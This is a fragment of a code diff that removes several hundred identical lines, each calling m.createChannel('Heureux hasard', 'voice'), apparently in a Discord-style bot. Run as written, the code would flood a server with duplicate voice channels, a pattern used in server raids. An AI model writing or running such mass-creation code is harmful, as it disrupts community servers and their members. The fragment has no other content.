-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
